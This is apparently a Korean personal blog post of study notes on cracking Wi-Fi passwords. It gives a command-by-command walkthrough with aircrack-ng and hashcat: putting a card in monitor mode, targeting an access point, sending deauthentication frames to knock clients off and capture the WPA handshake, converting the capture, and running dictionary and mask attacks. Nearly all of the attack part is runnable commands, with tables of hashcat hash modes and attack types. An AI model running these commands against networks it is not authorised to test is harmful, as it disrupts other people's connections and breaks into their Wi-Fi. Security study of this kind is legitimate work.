---
layout: post
title: Aircrack-ng
subtitle: 무선AP 해킹
author: 마준영
categories: etc
tags:
---
## Aircrack
```shell
iwconfig #랜카드 이름 확인
sudo airmon-ng start wlan0 #monitor모드 실행, wlan0은 랜카드 이름
sudo airodump-ng wlan0 #스캔 실행
iw list | grep -A 10 Frequencies #랜카드가 주파수 대역이 되는지 확인 Frequencies에서 확인가능
sudo airodump-ng wlan0 --channel 36 #특정 5GHz 채널만 스캔
sudo airodump-ng wlan0 --band a #`--band a` : 5GHz 대역
sudo airodump-ng wlan0 --band abg #`--band abg` : 2.4GHz + 5GHz 전체
sudo airodump-ng wlan0 --band bg #`--band bg` : 2.4GHz전체
sudo airodump-ng wlan0 --band a -w [파일명] #파일로 저장
sudo airodump-ng -c 11 --bssid [공유기 맥주소] -w [저장될 파일명] wlan0 #타겟을 정한 후 채널을 고정하여 스캔하며 대기
sudo aireplay-ng --deauth 10 -a [공유기 맥주소] -c [클라이언트 맥주소] wlan0 #클라이언트의 연결을 강제 종료, 재연결되면 handshake 패킷을 딸 수 있다. deauth는  try횟수
sudo aircrack-ng [캡처파일].cap -w [워드리스트] #사전공격
```

DATA : 패킷량 으로 추정

PSK : Presharedkey, 인데 wifi가 미리 공유된 key값을 이용해서 크랙이 일반적임
SAE,MGT : 찾아보기

WEP, WAP, WAP2, WAP3
OPN

4,6,7,19,25

Handshake 성공시 
![](/assets/images/posts/2025-03-26-aircrack/a04bfe866a566f081c5ff93c3e601a75_MD5.jpeg)

Crack 성공시
![](/assets/images/posts/2025-03-26-aircrack/a7623d10a8117b57a88d3995f81f0be8_MD5.jpeg)

## hashcat으로 크랙
딕셔너리 기반은 현실적이지 않은 것 같다.
hashcat으로 해보자.
```shell
aircrack-ng [파일이름].cap -J [출력파일명] #hasndshake가 있는 cap파일을 hashcat용으로 변환
hashcat -m 2500 -a 0 handshake.hccapx /usr/share/wordlists/rockyou.txt #안된다
```
- `-m 2500` → WPA/WPA2 (hccapx 포맷)
    
- `-a 0` → 사전(dictionary) 공격
    
- `handshake.hccapx` → 대상 해시 파일
    
- `/usr/share/wordlists/rockyou.txt` → 워드리스트 경로

뭔가 .cap에서 hashcat용으로 변환할때 문제가 있었던 것 같다.
전용 툴을 이용해서 변환해보자.
```shell
hcxpcapngtool -o [만드려는 파일명].hccapx [cap파일].pcapng #특이하게 원본 파일명이 뒤에옴
hcxpcapngtool -o home-01.22000 home-01.cap #확장자는 hccapx든 22000이든 상관 없는듯
hashcat -m 2500 -a 0 handshake.hccapx /usr/share/wordlists/rockyou.txt #만든 파일로 워드리스트 크랙하기, 2500은 구버전이라 안되는거같다. 22000으로 하는게 좋을듯
hashcat -m 22000 -a 3 home-01.22000 ?u?u?u?u?d?d?d?d #마스크공격 예시
```

| 옵션         | 의미                                          |
| ---------- | ------------------------------------------- |
| `-m 0`     | MD5                                         |
| `-m 100`   | SHA1                                        |
| `-m 22000` | **WPA/WPA2 (EAPOL + PMKID)** 👉 우리가 지금 쓰는 거 |
| `-m 2500`  | WPA/WPA2 (구버전 hccapx, 현재는 deprecated)       |
| `-m 3000`  | LM (Windows old password hash)              |
| `-m 1000`  | NTLM (Windows 로그인 해시)                       |

| 옵션     | 공격 방식                     | 설명                   |
| ------ | ------------------------- | -------------------- |
| `-a 0` | **Wordlist (Dictionary)** | 워드리스트에 있는 단어들로 대입 공격 |
| `-a 1` | Combination               | 두 워드리스트를 조합해서 시도     |
| `-a 3` | **Brute-force (마스크 공격)**  | 직접 문자 조합을 정의해서 전수조사  |
| `-a 6` | Hybrid Wordlist + Mask    | 단어 + 마스크 조합          |
| `-a 7` | Hybrid Mask + Wordlist    | 마스크 + 단어 조합          |
